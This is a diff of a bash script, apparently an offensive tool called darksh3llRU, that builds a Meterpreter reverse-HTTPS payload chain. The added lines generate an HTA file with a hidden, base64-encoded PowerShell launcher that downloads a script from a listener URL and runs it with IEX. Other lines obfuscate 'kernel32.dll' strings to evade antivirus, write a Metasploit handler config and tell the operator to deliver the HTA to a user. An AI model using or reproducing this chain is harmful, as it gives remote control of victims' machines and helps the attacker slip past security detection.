@@ -4,13 +4,13 @@
 # darksh3llRU beta v1.0
 
 # payload options for staged msfvenom -p windows/x64/meterpreter/reverse_https --list-options
-# payload options for staged msfvenom -p windows/x64/meterpreter_reverse_https --list-options
 #payload="windows/x64/meterpreter_reverse_https"
-payload="windows/x64/meterpreter/reverse_winhttps"
-ListenerIP=192.168.0.111
+payload="windows/x64/meterpreter/reverse_https"
+ListenerIP=192.168.114.26
 ListenerPort=443
 ListenerURI="/logout/"
 ProxyType=HTTP
+#HttpProxyIE=true
 ProxyHost=""
 ProxyPort=""
 ProxyUser=""
@@ -18,11 +18,44 @@ ProxyPass=""
 declare "UserAgent"="'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'"
 DownloadURL="http://10.0.8.4:8080"
 
+# STAGE1 HTA
+# just raw hta-psh, no need for real options
+hta_exploit="msfvenom -p $payload LHOST=127.0.0.1 LPORT=443 -f hta-psh -o user_settings.hta"
+printf "Creating dumb HTA-PSH payload:\n$hta_exploit...\n"
+$hta_exploit
 
-# payload options one liner
-# reverse_https with proxy settings for stageless only
+
+# create hta_payload template !CUSTOMIZE IT IF NEEDED!
+# AWARE of escape!
+printf "Creating hta payload...\n"
+printf "if([IntPtr]::Size -eq 4)" > hta_payload.txt
+printf "{\$babushka=\$env:windir+'\sysnative\WindowsPowerShell\\\v1.0\powershell.exe'}else{\$babushka='powershell.exe'};" >> hta_payload.txt
+printf "\$samosval=New-Object System.Diagnostics.ProcessStartInfo;" >> hta_payload.txt
+printf "\$samosval.FileName=\$babushka;" >> hta_payload.txt
+printf "\$samosval.Arguments=\"[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR $DownloadURL/final_pshnet_revhttps.ps1 -UserAgent 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'|IEX\";" >> hta_payload.txt
+printf "\$samosval.UseShellExecute=\$false;" >> hta_payload.txt
+printf "\$samosval.RedirectStandardOutput=\$false;" >> hta_payload.txt
+printf "\$samosval.WindowStyle='Hidden';" >> hta_payload.txt
+printf "\$samosval.CreateNoWindow=\$false;" >> hta_payload.txt
+printf "\$traktor=[System.Diagnostics.Process]::Start(\$samosval);" >> hta_payload.txt
+
+# convert hta_payload template to base64 utf-16le
+cat hta_payload.txt | iconv -f ascii -t utf-16le | base64 | tr -d '\n' > hta_payload.base64.txt
+hta_payload_base64=$(<hta_payload.base64.txt)
+printf "Generated base64 encoded:\n$hta_payload_base64\n"
+
+# change base64 payload to our template
+sed -i "s,hidden -e\(.*\)\",hidden -Exec Bypass -e $hta_payload_base64\",g" user_settings.hta
+printf "Hta exploit file updated with encoded payload pointing to $DownloadURL/final_pshnet_revhttps.ps1\n"
+
+read -p "DEBUG:HTA Generated, Press any key to continue or  cancel revhttps payload creation and modification...\n" -n1 -s
+
+
+# STAGE2 PSH-NET dropper
+# PSH-NET payload options one liner
+# reverse_https with proxy settings stageless only
 #payload_options="LHOST=$ListenerIP LPORT=$ListenerPort LURI=$ListenerURI HttpProxyType=$ProxyType HttpProxyHost=$ProxyHost HttpProxyPort=$ProxyPort HttpProxyUser=$ProxyUser HttpProxyPass=$ProxyPass HttpUserAgent=$UserAgent"
-# reverse https without proxy settings for staged only
+# reverse https without proxy setting staged only
 payload_options="LHOST=$ListenerIP LPORT=$ListenerPort LURI=$ListenerURI HttpUserAgent=$UserAgent OverrideLHOST=$ListenerIP OverrideLPORT=$ListenerPort OverrideRequestHost=true"
 printf "Payload and options used:\n$payload\n$payload_options\n...\n"
 
@@ -118,7 +151,6 @@ do
 done
 
 # do kernel32.dll things to avoid detection
-#ISB.Downloader!gen245
 sed -i 's,kernel32.dll,ke"+"rn"+"e"+"l"+"32."+"d"+"l"+"l,g' final_pshnet_revhttps.ps1
 
 printf "Final psh-net usage example:\n"
@@ -140,5 +172,8 @@ printf "set HttpUserAgent $UserAgent\n" >> multihandler.rc
 printf "set OverrideLHOST $ListenerIP\n" >> multihandler.rc
 printf "set OverrideLPORT $ListenerPort\n" >> multihandler.rc
 printf "set OverrideRequestHost true\n" >> multihandler.rc
+printf "set exitonsession false" >> multihandler.rc
 printf "exploit -j -z\n" >> multihandler.rc
 printf "Run listener: msfconsole -r multihandler.rc\n"
+
+printf "Use user_settings.hta to deliver meterpreter payload to user\n"
